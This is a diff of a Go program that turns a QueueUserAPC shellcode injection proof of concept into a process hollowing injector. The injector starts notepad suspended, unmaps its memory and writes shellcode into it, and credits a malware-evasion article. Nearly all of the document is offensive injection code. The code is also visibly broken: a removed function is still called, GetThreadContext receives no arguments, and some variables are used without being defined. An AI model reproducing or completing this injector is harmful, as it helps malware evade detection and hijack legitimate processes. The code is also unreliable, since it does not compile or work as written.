@@ -1,21 +1,19 @@
 /*
-	8/25/2020
-
-	QueueUserAPC shellcode injection technique
+	@saulpanders
+	Process hollowing shellcode injection technique
 
 	currently pops shellcode for calc
 
 
 	METHOD:
 
-			1. OpenProcess to get handle to PID with CREATE_THREAD_ACCESS (see below)
-			2. VirtualAllocEx to create/reserve a read-write page in memory
-			3. WriteProcessMemory copies shellcode to address of rw page
-			4. VirtualProtectEx adjusts page to allow execution
-			5. CreateRemoteThread kicks off execution
+			1. Start new process in suspended state by calling CreateProcess w/ CREATE_SUSPENDED (0x4)
+			2. Unmap memory allocated for proc w/ NtUnmapViewOfSection
+			3. Allocate space in memory for payload using VirtualAllocEx
+			4. Inject payload into memory at allocated region w/ WriteProcessMemory
+			5. Change execution point of target process to start on payload w/ GetThreadContext
+			6. Resume target process execution by calling ResumeThread
 
-
-			NOTE: currently only works if verbose is enabled?
 
 	TODO:
 
@@ -24,12 +22,15 @@
 
 	BUILD:
 
-	sources:
+		go build processhollowing.go -o goProcessHollowing.exe
 
-		https://github.com/Ne0nd0g/go-shellcode/blob/master/cmd/CreateRemoteThread/main.go
-		https://posts.specterops.io/the-curious-case-of-queueuserapc-3f62e966d2cb
+		I like to use notepad to test
 
-	hoping to use this as a jumping off poiint to learn process injection techniques in golang
+		///SHIT IS BROKEN FIX LATER (NO THREAD CONTEXT DATA STRUCT, MORE RESEARCH NEEDED)
+
+
+	inspired by https://www.deepinstinct.com/2019/09/15/malware-evasion-techniques-part-1-process-injection-and-manipulation/
+
 */
 
 package main
@@ -47,6 +48,8 @@ import (
 )
 
 const (
+	CREATE_SUSPENDED = 0x00000004
+
 	PROCESS_CREATE_THREAD     = 0x0080
 	PROCESS_QUERY_INFORMATION = 0x0400
 	PROCESS_VM_OPERATION      = 0x0008
@@ -73,7 +76,6 @@ func main() {
 	//ARGS
 
 	verbose := flag.Bool("verbose", false, "Enable verbose output")
-	targetprocess := flag.String("targetprocess", "C:\\WINDOWS\\system32\\notepad.exe", "Target process to spawn inject into (full path plz)")
 	flag.Parse()
 
 	//Pop Calc Shellcode - SOLID SHELLCODE POC
@@ -82,21 +84,25 @@ func main() {
 		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
 	}
 
+	//import libraries
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+	ntdll := windows.NewLazySystemDLL("ntdll.dll")
 
 	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
-	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
 	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
-	QueueUserAPC := kernel32.NewProc("QueueUserAPC")
+	GetThreadContext := kernel32.NewProc("GetThreadContext")
+	ResumeThread := kernel32.NewProc("ResumeThread")
+
+	NtUnmapViewOfSection := ntdll.NewProc("NtUnmapViewOfSection")
 
 	var si windows.StartupInfo
 	var pi windows.ProcessInformation
 	var psec windows.SecurityAttributes
 	var tsec windows.SecurityAttributes
 
-	argv := syscall.StringToUTF16Ptr(*targetprocess)
-
-	errCreateProcess := windows.CreateProcess(argv, nil, &psec, &tsec, false, 0, nil, nil, &si, &pi)
+	//create suspended process - CreateProcess
+	argv = syscall.StringToUTF16Ptr("C:\\WINDOWS\\system32\\notepad.exe")
+	errCreateProcess := windows.CreateProcess(argv, nil, &psec, &tsec, false, CREATE_SUSPENDED, nil, nil, &si, &pi)
 
 	if errCreateProcess != nil {
 		log.Fatal(fmt.Sprintf("[!]Error calling CreateProcess:\r\n%s", errCreateProcess.Error()))
@@ -105,11 +111,24 @@ func main() {
 		fmt.Println(fmt.Sprintf("[-]Successfully created a process with PID: %d", pi.ProcessId))
 	}
 
-	//Allocating memory in process - VirtualAllocEx
-	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pi.Process), 0, uintptr(len(shellcode)), MEM_PERMISSIONS, PAGE_READWRITE)
+	///FIX BELOW
+	//unmapping memory - NtUnmapViewOfSection
+	_, _, errNtUnmapViewOfSection := NtUnmapViewOfSection.Call(uintptr(pi.Process))
 
-	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
+	if errNtUnmapViewOfSection != nil && errNtUnmapViewOfSection.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("[!]Error calling NtUnmapViewOfSection:\r\n%s", errNtUnmapViewOfSection.Error()))
+	}
+	if *verbose {
+		fmt.Println(fmt.Sprintf("[-]Successfully unmapped memory in %d", pi.ProcessId))
+
+	}
+
+	//THIS IS PROB FINE
+	//Allocating memory in process - VirtualAllocEx
+	addr, _, errVirtualAllocEx := VirtualAllocEx.Call(uintptr(pi.Process), 0, uintptr(len(shellcode)), MEM_PERMISSIONS, PAGE_READWRITE)
+
+	if errVirtualAllocEx != nil && errVirtualAllocEx.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAllocEx:\r\n%s", errVirtualAllocEx.Error()))
 	}
 
 	if addr == 0 {
@@ -130,12 +149,15 @@ func main() {
 
 	}
 
-	th_addr, errOpenThread := windows.OpenThread(THREAD_SET_CONTEXT, false, pi.ThreadId)
-	if errOpenThread != nil && errOpenThread.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("Error calling OpenThread:\r\n%s", errOpenThread.Error()))
+	//getting current thread context (to resume) GetThreadContext
+	_, _, errGetThreadContext := GetThreadContext.Call()
+
+	if errGetThreadContext != nil && errGetThreadContext.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("[!]Error calling GetThreadContext:\r\n%s", errGetThreadContext.Error()))
 	}
 	if *verbose {
-		fmt.Println(fmt.Sprintf("[-]Opened handle in thread ID: %d", pi.ThreadId))
+		fmt.Println(fmt.Sprintf("[-]Successfully got thread context  %d", pi.ProcessId))
+
 	}
 
 	//Modifying permissions from RW to RX - VirtualProtectEx (RWX is bad and not opsec safe)
@@ -145,15 +167,7 @@ func main() {
 		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
 	}
 	if *verbose {
-		fmt.Println(fmt.Sprintf("[-]Successfully change memory permissions to PAGE_EXECUTE_READ in PID %d", pi.ProcessId))
+		fmt.Println(fmt.Sprintf("[-]Successfully change memory permissions to PAGE_EXECUTE_READ in PID %d", *pid))
 	}
 
-	_, _, errQueueUserAPC := QueueUserAPC.Call(addr, (uintptr)(th_addr), 0)
-
-	if errQueueUserAPC != nil && errQueueUserAPC.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("Error calling QueueUserAPC:\r\n%s", errQueueUserAPC.Error()))
-	}
-	if *verbose {
-		fmt.Println(fmt.Sprintf("[-]Successfully executed QueueUserAPC"))
-	}
 }
